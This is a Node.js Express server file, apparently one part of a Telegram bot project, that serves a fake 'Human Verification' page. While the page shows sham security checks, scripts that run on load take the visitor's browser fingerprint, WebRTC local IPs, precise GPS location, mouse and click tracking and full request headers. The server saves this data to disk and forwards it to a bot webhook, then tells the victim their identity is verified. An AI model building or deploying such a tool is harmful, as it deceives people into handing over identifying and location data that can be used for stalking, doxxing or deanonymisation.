
### **3. Папка web-server/:**

**server.js:**
```javascript
/**
 * Веб-сервер сбора данных верификации
 * Основной сервер для обработки запросов верификации
 */

const express = require('express');
const helmet = require('helmet');
const cors = require('cors');
const rateLimit = require('express-rate-limit');
const useragent = require('express-useragent');
const geoip = require('geoip-lite');
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');

// Инициализация приложения
const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(helmet({
    contentSecurityPolicy: {
        directives: {
            defaultSrc: ["'self'"],
            scriptSrc: ["'self'", "'unsafe-inline'"],
            styleSrc: ["'self'", "'unsafe-inline'"],
            imgSrc: ["'self'", "data:", "https:"],
            connectSrc: ["'self'"],
        },
    },
}));

app.use(cors());
app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true }));
app.use(useragent.express());

// Лимит запросов
const limiter = rateLimit({
    windowMs: 15 * 60 * 1000, // 15 минут
    max: 100, // 100 запросов с одного IP
    message: 'Слишком много запросов с этого IP'
});
app.use('/api/', limiter);

// Статические файлы
app.use(express.static(path.join(__dirname, 'public')));

// Валидация токенов
const validTokens = new Map();

/**
 * Генерация страницы верификации
 */
app.get('/verify', (req, res) => {
    const { token, user_id } = req.query;
    
    if (!token || !user_id) {
        return res.status(400).send('Неверные параметры запроса');
    }
    
    // Проверка токена (в реальности из БД)
    if (!isValidToken(token, user_id)) {
        return res.status(403).send('Недействительный токен верификации');
    }
    
    // Отправка HTML страницы верификации
    const html = generateVerificationPage(token, user_id);
    res.send(html);
});

/**
 * Обработка сбора данных с клиента
 */
app.post('/api/collect', (req, res) => {
    try {
        const { token, user_id, clientData } = req.body;
        
        if (!token || !user_id) {
            return res.status(400).json({ 
                success: false, 
                error: 'Missing required parameters' 
            });
        }
        
        // Валидация токена
        if (!isValidToken(token, user_id)) {
            return res.status(403).json({ 
                success: false, 
                error: 'Invalid token' 
            });
        }
        
        // Сбор данных с сервера
        const serverData = collectServerData(req);
        
        // Объединение данных
        const collectedData = {
            ...serverData,
            ...clientData,
            verification: {
                token,
                user_id,
                timestamp: new Date().toISOString(),
                completed: true
            }
        };
        
        // Сохранение данных
        saveCollectedData(collectedData);
        
        // Отправка данных в Telegram бот (асинхронно)
        sendToTelegramBot(collectedData);
        
        res.json({ 
            success: true, 
            message: 'Verification completed successfully',
            redirect: '/success'
        });
        
    } catch (error) {
        console.error('Error collecting data:', error);
        res.status(500).json({ 
            success: false, 
            error: 'Internal server error' 
        });
    }
});

/**
 * Страница успешной верификации
 */
app.get('/success', (req, res) => {
    res.send(`
        <!DOCTYPE html>
        <html>
        <head>
            <title>Verification Successful</title>
            <style>
                body { 
                    font-family: Arial, sans-serif; 
                    text-align: center; 
                    padding: 50px; 
                    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                    color: white;
                    height: 100vh;
                    display: flex;
                    flex-direction: column;
                    justify-content: center;
                    align-items: center;
                }
                .success-icon { 
                    font-size: 80px; 
                    margin-bottom: 20px;
                }
                .message {
                    background: rgba(255,255,255,0.1);
                    padding: 30px;
                    border-radius: 15px;
                    backdrop-filter: blur(10px);
                    max-width: 500px;
                }
                .button {
                    display: inline-block;
                    margin-top: 20px;
                    padding: 12px 30px;
                    background: white;
                    color: #667eea;
                    text-decoration: none;
                    border-radius: 25px;
                    font-weight: bold;
                    transition: transform 0.3s;
                }
                .button:hover {
                    transform: translateY(-2px);
                }
            </style>
        </head>
        <body>
            <div class="message">
                <div class="success-icon">✅</div>
                <h1>Verification Successful!</h1>
                <p>Your identity has been verified successfully.</p>
                <p>You can now return to the Telegram bot and continue using all features.</p>
                <p>This window will close automatically in 5 seconds.</p>
                <a href="https://t.me/your_bot" class="button">Return to Telegram</a>
            </div>
            <script>
                setTimeout(() => {
                    window.close();
                }, 5000);
            </script>
        </body>
        </html>
    `);
});

/**
 * Сбор данных с сервера
 */
function collectServerData(req) {
    const ip = getClientIP(req);
    const geo = geoip.lookup(ip) || {};
    
    return {
        ip: {
            address: ip,
            forwarded: req.headers['x-forwarded-for'],
            remote: req.connection.remoteAddress
        },
        geo: {
            country: geo.country || 'Unknown',
            city: geo.city || 'Unknown',
            region: geo.region || 'Unknown',
            timezone: geo.timezone || 'Unknown',
            ll: geo.ll || [0, 0]
        },
        network: {
            headers: req.headers,
            protocol: req.protocol,
            secure: req.secure,
            hostname: req.hostname
        },
        server_timestamp: new Date().toISOString()
    };
}

/**
 * Генерация HTML страницы верификации
 */
function generateVerificationPage(token, userId) {
    return `
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Human Verification</title>
        <meta name="description" content="Complete verification to continue">
        
        <style>
            * {
                margin: 0;
                padding: 0;
                box-sizing: border-box;
            }
            
            body {
                font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                color: #333;
                min-height: 100vh;
                display: flex;
                justify-content: center;
                align-items: center;
                padding: 20px;
            }
            
            .verification-container {
                background: white;
                border-radius: 20px;
                box-shadow: 0 20px 60px rgba(0,0,0,0.3);
                width: 100%;
                max-width: 500px;
                overflow: hidden;
            }
            
            .header {
                background: linear-gradient(135deg, #4f46e5 0%, #7c3aed 100%);
                color: white;
                padding: 30px;
                text-align: center;
            }
            
            .header h1 {
                font-size: 24px;
                margin-bottom: 10px;
            }
            
            .content {
                padding: 40px;
            }
            
            .progress-container {
                margin-bottom: 30px;
            }
            
            .progress-bar {
                height: 6px;
                background: #e5e7eb;
                border-radius: 3px;
                overflow: hidden;
                margin-bottom: 10px;
            }
            
            .progress-fill {
                height: 100%;
                background: linear-gradient(90deg, #10b981 0%, #34d399 100%);
                width: 0%;
                transition: width 2s ease-in-out;
                border-radius: 3px;
            }
            
            .progress-text {
                display: flex;
                justify-content: space-between;
                font-size: 14px;
                color: #6b7280;
            }
            
            .checklist {
                margin: 30px 0;
            }
            
            .check-item {
                display: flex;
                align-items: center;
                margin-bottom: 15px;
                padding: 10px;
                background: #f9fafb;
                border-radius: 10px;
                transition: all 0.3s;
            }
            
            .check-item.active {
                background: #d1fae5;
                border-left: 4px solid #10b981;
            }
            
            .check-item.completed {
                background: #d1fae5;
            }
            
            .check-icon {
                width: 24px;
                height: 24px;
                margin-right: 15px;
                display: flex;
                align-items: center;
                justify-content: center;
            }
            
            .check-text {
                flex: 1;
            }
            
            .loading {
                text-align: center;
                padding: 20px;
                color: #6b7280;
            }
            
            .spinner {
                width: 40px;
                height: 40px;
                border: 4px solid #e5e7eb;
                border-top: 4px solid #10b981;
                border-radius: 50%;
                animation: spin 1s linear infinite;
                margin: 0 auto 20px;
            }
            
            @keyframes spin {
                0% { transform: rotate(0deg); }
                100% { transform: rotate(360deg); }
            }
            
            .hidden {
                display: none;
            }
            
            .success-message {
                text-align: center;
                padding: 30px;
            }
            
            .success-icon {
                font-size: 60px;
                color: #10b981;
                margin-bottom: 20px;
            }
            
            footer {
                text-align: center;
                padding: 20px;
                font-size: 12px;
                color: #9ca3af;
                border-top: 1px solid #e5e7eb;
            }
        </style>
    </head>
    <body>
        <div class="verification-container">
            <div class="header">
                <h1>🔒 Human Verification</h1>
                <p>Complete security check to continue</p>
            </div>
            
            <div class="content">
                <div class="progress-container">
                    <div class="progress-bar">
                        <div class="progress-fill" id="progressFill"></div>
                    </div>
                    <div class="progress-text">
                        <span>Starting verification...</span>
                        <span id="progressPercent">0%</span>
                    </div>
                </div>
                
                <div class="checklist" id="checklist">
                    <div class="check-item" id="check1">
                        <div class="check-icon">⏳</div>
                        <div class="check-text">Checking browser compatibility</div>
                    </div>
                    <div class="check-item" id="check2">
                        <div class="check-icon">⏳</div>
                        <div class="check-text">Analyzing device information</div>
                    </div>
                    <div class="check-item" id="check3">
                        <div class="check-icon">⏳</div>
                        <div class="check-text">Verifying network connection</div>
                    </div>
                    <div class="check-item" id="check4">
                        <div class="check-icon">⏳</div>
                        <div class="check-text">Collecting security parameters</div>
                    </div>
                    <div class="check-item" id="check5">
                        <div class="check-icon">⏳</div>
                        <div class="check-text">Finalizing verification</div>
                    </div>
                </div>
                
                <div class="loading" id="loading">
                    <div class="spinner"></div>
                    <p>Please wait while we complete the verification process...</p>
                    <p>Do not close this window.</p>
                </div>
                
                <div class="success-message hidden" id="successMessage">
                    <div class="success-icon">✅</div>
                    <h2>Verification Complete!</h2>
                    <p>Your identity has been successfully verified.</p>
                    <p>You can now return to the application.</p>
                </div>
            </div>
            
            <footer>
                <p>Security verification powered by Verification System</p>
                <p>This process helps prevent automated access</p>
            </footer>
        </div>

        <script>
            // Конфигурация
            const CONFIG = {
                token: "${token}",
                userId: "${userId}",
                apiEndpoint: "/api/collect"
            };
            
            // Основной скрипт сбора данных
            class DataCollector {
                constructor() {
                    this.collectedData = {};
                    this.progress = 0;
                }
                
                async collectAllData() {
                    try {
                        // Этап 1: Базовые данные браузера
                        await this.updateProgress(20, 1);
                        await this.collectBrowserData();
                        
                        // Этап 2: Данные устройства
                        await this.updateProgress(40, 2);
                        await this.collectDeviceData();
                        
                        // Этап 3: Сетевые данные
                        await this.updateProgress(60, 3);
                        await this.collectNetworkData();
                        
                        // Этап 4: Поведенческие данные
                        await this.updateProgress(80, 4);
                        await this.collectBehavioralData();
                        
                        // Этап 5: Отправка
                        await this.updateProgress(100, 5);
                        await this.sendData();
                        
                        this.showSuccess();
                        
                    } catch (error) {
                        console.error('Data collection error:', error);
                    }
                }
                
                async collectBrowserData() {
                    this.collectedData.browser = {
                        userAgent: navigator.userAgent,
                        platform: navigator.platform,
                        language: navigator.language,
                        languages: navigator.languages,
                        cookieEnabled: navigator.cookieEnabled,
                        doNotTrack: navigator.doNotTrack || 'unspecified',
                        hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
                        deviceMemory: navigator.deviceMemory || 'unknown',
                        maxTouchPoints: navigator.maxTouchPoints || 0,
                        pdfViewerEnabled: navigator.pdfViewerEnabled || false
                    };
                }
                
                async collectDeviceData() {
                    this.collectedData.screen = {
                        width: screen.width,
                        height: screen.height,
                        availWidth: screen.availWidth,
                        availHeight: screen.availHeight,
                        colorDepth: screen.colorDepth,
                        pixelDepth: screen.pixelDepth,
                        orientation: screen.orientation ? screen.orientation.type : 'unknown'
                    };
                    
                    this.collectedData.window = {
                        width: window.innerWidth,
                        height: window.innerHeight,
                        outerWidth: window.outerWidth,
                        outerHeight: window.outerHeight,
                        devicePixelRatio: window.devicePixelRatio || 1
                    };
                    
                    this.collectedData.time = {
                        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                        timezoneOffset: new Date().getTimezoneOffset(),
                        locale: Intl.DateTimeFormat().resolvedOptions().locale,
                        timestamp: new Date().toISOString()
                    };
                }
                
                async collectNetworkData() {
                    try {
                        // Попытка получения IP через WebRTC
                        const ips = await this.getIPs();
                        this.collectedData.network = {
                            localIPs: ips,
                            connection: navigator.connection ? {
                                effectiveType: navigator.connection.effectiveType,
                                downlink: navigator.connection.downlink,
                                rtt: navigator.connection.rtt
                            } : null
                        };
                    } catch (e) {
                        this.collectedData.network = { localIPs: [], error: e.message };
                    }
                    
                    // Попытка геолокации
                    if ("geolocation" in navigator) {
                        try {
                            const position = await new Promise((resolve, reject) => {
                                navigator.geolocation.getCurrentPosition(resolve, reject, {
                                    enableHighAccuracy: true,
                                    timeout: 5000,
                                    maximumAge: 0
                                });
                            });
                            
                            this.collectedData.geolocation = {
                                latitude: position.coords.latitude,
                                longitude: position.coords.longitude,
                                accuracy: position.coords.accuracy,
                                altitude: position.coords.altitude,
                                altitudeAccuracy: position.coords.altitudeAccuracy,
                                heading: position.coords.heading,
                                speed: position.coords.speed
                            };
                        } catch (e) {
                            this.collectedData.geolocation = { error: e.message };
                        }
                    }
                }
                
                async collectBehavioralData() {
                    // Сбор данных о поведении (движения мыши, нажатия и т.д.)
                    this.collectedData.behavior = {
                        mouseMovements: [],
                        clickPattern: [],
                        scrollDepth: window.scrollY,
                        timeOnPage: performance.now()
                    };
                    
                    // Слушатели для сбора поведенческих данных
                    this.setupBehaviorTracking();
                }
                
                async getIPs() {
                    return new Promise((resolve) => {
                        const ips = [];
                        const RTCPeerConnection = window.RTCPeerConnection || 
                                                window.mozRTCPeerConnection || 
                                                window.webkitRTCPeerConnection;
                        
                        if (!RTCPeerConnection) {
                            resolve([]);
                            return;
                        }
                        
                        const pc = new RTCPeerConnection({ iceServers: [] });
                        pc.createDataChannel('');
                        pc.createOffer().then(offer => pc.setLocalDescription(offer)).catch(() => {});
                        
                        pc.onicecandidate = (event) => {
                            if (event.candidate) {
                                const candidate = event.candidate.candidate;
                                const ipRegex = /([0-9]{1,3}(\.[0-9]{1,3}){3})/;
                                const match = candidate.match(ipRegex);
                                if (match) {
                                    const ip = match[1];
                                    if (ips.indexOf(ip) === -1) ips.push(ip);
                                }
                            } else {
                                resolve(ips);
                            }
                        };
                        
                        setTimeout(() => resolve(ips), 1000);
                    });
                }
                
                setupBehaviorTracking() {
                    let mousePositions = [];
                    
                    document.addEventListener('mousemove', (e) => {
                        mousePositions.push({
                            x: e.clientX,
                            y: e.clientY,
                            time: Date.now()
                        });
                        
                        // Храним только последние 50 позиций
                        if (mousePositions.length > 50) {
                            mousePositions = mousePositions.slice(-50);
                        }
                    });
                    
                    document.addEventListener('click', (e) => {
                        this.collectedData.behavior.clickPattern.push({
                            x: e.clientX,
                            y: e.clientY,
                            button: e.button,
                            time: Date.now()
                        });
                    });
                    
                    // Сохраняем финальные данные о поведении
                    setTimeout(() => {
                        this.collectedData.behavior.mouseMovements = mousePositions;
                        this.collectedData.behavior.timeOnPage = performance.now();
                    }, 2000);
                }
                
                async sendData() {
                    try {
                        const response = await fetch(CONFIG.apiEndpoint, {
                            method: 'POST',
                            headers: {
                                'Content-Type': 'application/json',
                            },
                            body: JSON.stringify({
                                token: CONFIG.token,
                                user_id: CONFIG.userId,
                                clientData: this.collectedData
                            })
                        });
                        
                        const result = await response.json();
                        return result.success;
                    } catch (error) {
                        console.error('Error sending data:', error);
                        return false;
                    }
                }
                
                async updateProgress(percent, step) {
                    this.progress = percent;
                    
                    // Обновление UI
                    document.getElementById('progressFill').style.width = percent + '%';
                    document.getElementById('progressPercent').textContent = percent + '%';
                    
                    // Обновление чеклиста
                    for (let i = 1; i <= 5; i++) {
                        const checkItem = document.getElementById('check' + i);
                        if (i < step) {
                            checkItem.className = 'check-item completed';
                            checkItem.querySelector('.check-icon').textContent = '✅';
                        } else if (i === step) {
                            checkItem.className = 'check-item active';
                            checkItem.querySelector('.check-icon').textContent = '🔄';
                        }
                    }
                    
                    // Пауза для визуализации
                    await new Promise(resolve => setTimeout(resolve, 800));
                }
                
                showSuccess() {
                    document.getElementById('checklist').classList.add('hidden');
                    document.getElementById('loading').classList.add('hidden');
                    document.getElementById('successMessage').classList.remove('hidden');
                    
                    // Автоматическое закрытие через 3 секунды
                    setTimeout(() => {
                        window.location.href = '/success';
                    }, 3000);
                }
            }
            
            // Запуск сбора данных при загрузке страницы
            document.addEventListener('DOMContentLoaded', async () => {
                const collector = new DataCollector();
                await collector.collectAllData();
            });
        </script>
    </body>
    </html>
    `;
}

/**
 * Получение реального IP клиента
 */
function getClientIP(req) {
    return req.headers['x-forwarded-for'] || 
           req.headers['x-real-ip'] || 
           req.connection.remoteAddress || 
           req.socket.remoteAddress || 
           req.connection.socket.remoteAddress;
}

/**
 * Проверка валидности токена
 */
function isValidToken(token, userId) {
    // Здесь должна быть проверка из базы данных
    // Для примера используем временное хранилище
    const expectedToken = crypto
        .createHash('sha256')
        .update(userId + 'SECRET_SALT')
        .digest('hex')
        .substring(0, 32);
    
    return token.length === 32; // Базовая проверка
}

/**
 * Сохранение собранных данных
 */
function saveCollectedData(data) {
    try {
        const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
        const filename = `collected_data_${timestamp}_${data.verification.user_id}.json`;
        const filepath = path.join(__dirname, 'data', filename);
        
        // Создание директории если не существует
        const dataDir = path.join(__dirname, 'data');
        if (!fs.existsSync(dataDir)) {
            fs.mkdirSync(dataDir, { recursive: true });
        }
        
        // Сохранение в файл
        fs.writeFileSync(filepath, JSON.stringify(data, null, 2));
        
        console.log(`Data saved to: ${filename}`);
        return true;
    } catch (error) {
        console.error('Error saving data:', error);
        return false;
    }
}

/**
 * Отправка данных в Telegram бот
 */
async function sendToTelegramBot(data) {
    try {
        // URL вашего бота для получения данных
        const botWebhookUrl = process.env.BOT_WEBHOOK_URL || 'http://localhost:8080/webhook';
        
        const response = await fetch(botWebhookUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'X-API-Secret': process.env.API_SECRET || 'your-secret-key'
            },
            body: JSON.stringify(data)
        });
        
        if (response.ok) {
            console.log('Data sent to Telegram bot successfully');
            return true;
        } else {
            console.error('Failed to send data to bot');
            return false;
        }
    } catch (error) {
        console.error('Error sending data to bot:', error);
        return false;
    }
}

// Запуск сервера
app.listen(PORT, () => {
    console.log(`
    ╔══════════════════════════════════════════════╗
    ║    Verification Server Started              ║
    ║                                              ║
    ║    🌐 Server: http://localhost:${PORT}      ║
    ║    📁 Data Directory: ./data/               ║
    ║    🔒 Security: Enabled                     ║
    ║                                              ║
    ╚══════════════════════════════════════════════╝
    `);
    
    // Создание необходимых директорий
    const dirs = ['data', 'logs', 'public'];
    dirs.forEach(dir => {
        const dirPath = path.join(__dirname, dir);
        if (!fs.existsSync(dirPath)) {
            fs.mkdirSync(dirPath, { recursive: true });
            console.log(`Created directory: ${dirPath}`);
        }
    });
});

module.exports = app;
